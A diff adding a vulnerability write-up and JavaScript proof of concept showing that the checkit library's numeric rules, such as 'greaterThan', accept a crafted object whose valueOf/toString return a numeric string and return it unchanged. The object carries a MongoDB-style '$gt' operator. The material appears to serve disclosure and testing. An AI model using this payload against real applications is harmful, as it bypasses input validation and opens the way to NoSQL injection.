@@ -1,0 +1,33 @@
+Confirmed: the malicious object passes `greaterThan:100` validation untouched and is returned as-is (not coerced to a number), because checkit's internal numeric check calls the native `isFinite` directly (implicit `ToNumber` coercion via `valueOf`/`toString`) instead of type-checking first like `Number.isFinite`/lodash's `_.isFinite` do. This lets a non-numeric object (e.g. one shaped like a MongoDB operator injection payload) sail through a "must be a number" rule.
+
+```javascript
+// Exploit: checkit's numeric validators (greaterThan/lessThan/between/range)
+// rely on a `nativeIsFinite`-style check: `!isNaN(parseFloat(n)) && isFinite(n)`.
+// Because it calls the *global* isFinite() instead of Number.isFinite(),
+// it implicitly coerces its argument via ToNumber (valueOf/toString).
+// A crafted object whose valueOf()/toString() returns a numeric-looking
+// string will pass the check, even though the value itself is never
+// converted to a primitive number -- letting non-numeric, attacker-shaped
+// payloads (e.g. NoSQL operator objects) sail through a "number" validation
+// rule unchanged.
+
+const Checkit = require("checkit");
+
+const maliciousPayload = {
+  toString() { return "999999"; },
+  valueOf() { return "999999"; },
+  $gt: "" // e.g. a MongoDB operator injection payload
+};
+
+const rules = new Checkit({ balance: "greaterThan:100" });
+
+const [err, result] = rules.runSync({ balance: maliciousPayload });
+
+console.log("Validation error:", err); // -> null, validation "passed"
+console.log("Value still an object, not a number:", result.balance);
+console.log("Same reference as attacker payload:", result.balance === maliciousPayload);
+
+if (!err && typeof result.balance === "object") {
+  console.log("VULNERABILITY TRIGGERED: non-numeric object bypassed numeric validation via nativeIsFinite's implicit ToNumber coercion");
+}
+```
